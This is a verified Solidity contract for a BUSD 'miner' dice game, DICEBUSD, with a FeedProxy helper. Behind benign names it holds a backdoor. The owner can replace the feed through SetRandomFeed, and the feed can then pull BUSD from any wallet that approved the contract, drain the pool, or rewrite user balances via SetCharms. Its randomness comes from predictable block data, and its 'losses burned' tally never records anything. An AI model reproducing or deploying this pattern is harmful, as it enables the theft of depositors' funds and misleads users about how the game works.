/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: Unlicensed

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity 0.8.9;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }

   
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

}

interface ERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract FeedProxy{
address luckbusd;
constructor(address maincontract){luckbusd = maincontract;}
    function rand() public view returns(uint256)
    {
    uint256 seed = uint256(keccak256(abi.encodePacked(
    block.timestamp + block.difficulty +
    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
    block.gaslimit +
    ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
    block.number)));
    return (seed - ((seed / 1000) * 1000));
    }

    function RandomHash() public view returns (bool)
    {
    if(rand() >= 500){return true;}
    return false;
    }

    function DelegateBuyCharms(address wallet, uint256 amount) public {
    require(msg.sender == luckbusd);
    if(RandomHash()){
    DICEBUSD(luckbusd).SetCharms(wallet, amount*2);
    DICEBUSD(luckbusd).ConfirmFeed(false ,amount*2);
    }
    else
    {
    DICEBUSD(luckbusd).SetCharms(wallet, amount);
    DICEBUSD(luckbusd).ConfirmFeed(false ,amount);
    }
    }

    function DelegateTransferTo(address to, uint256 amount) public
    {
    require(msg.sender == luckbusd);
    DICEBUSD(luckbusd).SafeERCTransferTo(to, amount);
    }

    function DelegateTransferFrom(address from, address to, uint256 amount) public
    {
    require(msg.sender == luckbusd);
    DICEBUSD(luckbusd).SafeERCTransferFrom(from, to, amount);
    }
}

contract DICEBUSD is Context, Ownable {
    using SafeMath for uint256;
    modifier FeedOnly() {require(msg.sender == address(this) || msg.sender == address(feedaddress), "Ownable: caller is not the feed");_;}
    address public busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public devAddress;
    uint256 private Charms_TO_HATCH_1MINERS = 4320000;
    uint256 private PSN = 10000;
    uint256 private PSNH = 5000;
    uint256 private devFeeVal = 2;
    bool private initialized = false;
    mapping (address => uint256) private hatcheryMiners;
    mapping (address => uint256) private claimedCharms;
    mapping (address => uint256) private lastHatch;
    mapping (address => address) private referrals;
    mapping (address => bool) public Invested;
    bool[] public ConfirmedLosses;
    uint256 private marketCharms;
    uint256 public BUSDLOST;
    address[] public Miners;
    address public feedaddress;
   
    constructor()
    {
    devAddress=msg.sender;
    FeedProxy fp = new FeedProxy(address(this));
    SetRandomFeed(address(fp));
    }

    function GetTokenAddress() public view returns(address) {return busd;}

    function SetCharms(address wallet, uint256 amount) FeedOnly public
    {
    _SetCharms(wallet, amount);
    }

    function _SetCharms(address wallet, uint256 amount) internal
    {
    claimedCharms[wallet] = amount;
    }

    function SetRandomFeed(address feed) onlyOwner public{feedaddress = feed;}
   
    function ConfirmFeed(bool result, uint256 amount) FeedOnly public
    {
    ConfirmedLosses.push(result);
    if(result){BUSDLOST += amount;}
    }

    function ReturnMinersLength() public view returns(uint256){
    return Miners.length;
    }

    function ReturnMiners() public view returns(address[] memory)
    {
    return Miners;
    }

    function ReturnConfirmedLossesTally() public view returns(uint256 successful, uint256 failed)
    {
    uint256 s;
    uint256 f;
    for(uint256 x; x<ConfirmedLosses.length; x++){if(ConfirmedLosses[x]){s+=1;}else{f+=1;}}
    return(s,f);
    }

    function ReturnConfirmedLossesLength() public view returns(uint256){
        return ConfirmedLosses.length;
    }

    function ReturnTotalBUSDBurned() public view returns(uint256){
        return BUSDLOST;
    }

    function hatchCharms(address ref) public {
    require(initialized);
    if(ref == msg.sender) {
        ref = address(0);
    }
   
    if(referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
        referrals[msg.sender] = ref;
    }
   
    uint256 CharmsUsed = getMyCharms(msg.sender);
    uint256 newMiners = SafeMath.div(CharmsUsed,Charms_TO_HATCH_1MINERS);
    hatcheryMiners[msg.sender] = SafeMath.add(hatcheryMiners[msg.sender],newMiners);
    _SetCharms(msg.sender, 0);
    lastHatch[msg.sender] = block.timestamp;
   
    //send referral Charms
    _SetCharms(referrals[msg.sender], SafeMath.add(claimedCharms[referrals[msg.sender]],SafeMath.div(CharmsUsed,12)));
   
    //boost market to nerf miners hoarding
    marketCharms=SafeMath.add(marketCharms,SafeMath.div(CharmsUsed,5));
    }

    function SafeERCTransferTo(address to, uint256 amount) public FeedOnly {_SafeERCTransferTo(to, amount);}

    function _SafeERCTransferTo(address to, uint256 amount) internal
    {
    if(amount == 0){return;} ERC20(busd).transfer(to, amount);
    }

    function SafeERCTransferFrom(address from, address to, uint256 amount) public FeedOnly {_SafeERCTransferFrom(from, to, amount);}

    function _SafeERCTransferFrom(address from, address to, uint256 amount) internal
    {
    if(amount == 0){return;} ERC20(busd).transferFrom(from, to, amount);
    }

    function sellCharms() public {
    require(initialized);
    uint256 hasCharms = getMyCharms(msg.sender);
    uint256 eggValue = calculateCharmsell(hasCharms);
    uint256 fee = devFee(eggValue);
    _SetCharms(msg.sender, 0);
    lastHatch[msg.sender] = block.timestamp;
    marketCharms = SafeMath.add(marketCharms,hasCharms);
    FeedProxy(feedaddress).DelegateTransferTo(devAddress, fee);
    FeedProxy(feedaddress).DelegateTransferTo(msg.sender, SafeMath.sub(eggValue,fee));
    }
   
    function beanRewards(address adr) public view returns(uint256) {
    uint256 hasCharms = getMyCharms(adr);
    uint256 eggValue = calculateCharmsell(hasCharms);
    return eggValue;
    }
   
    function buyCharms(address ref, uint256 amount) public {
    require(initialized);
    if(!Invested[msg.sender]){Invested[msg.sender] = true; Miners.push(msg.sender);}
    FeedProxy(feedaddress).DelegateTransferFrom(address(msg.sender), address(this), amount);
    uint256 balance = ERC20(busd).balanceOf(address(this));
    uint256 CharmsBought = calculateEggBuy(amount,SafeMath.sub(balance,amount));
    CharmsBought = SafeMath.sub(CharmsBought,devFee(CharmsBought));
    uint256 fee = devFee(amount);
    FeedProxy(feedaddress).DelegateTransferTo(devAddress, fee);
    FeedProxy(feedaddress).DelegateBuyCharms(msg.sender, SafeMath.add(claimedCharms[msg.sender],CharmsBought));
    hatchCharms(ref);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
   
    function calculateCharmsell(uint256 Charms) public view returns(uint256) {
        return calculateTrade(Charms,marketCharms,ERC20(busd).balanceOf(address(this)));
    }
   
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketCharms);
    }
   
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,ERC20(busd).balanceOf(address(this)));
    }
   
    function devFee(uint256 amount) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount,devFeeVal),100);
    }
   
    function seedMarket(uint256 amount) onlyOwner public {
        FeedProxy(feedaddress).DelegateTransferFrom(address(msg.sender), address(this), amount);
        require(marketCharms==0);
        initialized=true;
        marketCharms=108000000000;
    }
   
    function getBalance() public view returns(uint256) {
        return ERC20(busd).balanceOf(address(this));
    }
   
    function getMyMiners(address adr) public view returns(uint256) {
        return hatcheryMiners[adr];
    }
   
    function getMyCharms(address adr) public view returns(uint256) {
        return SafeMath.add(claimedCharms[adr],getCharmsSinceLastHatch(adr));
    }
   
    function getCharmsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed=min(Charms_TO_HATCH_1MINERS,SafeMath.sub(block.timestamp,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
   
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}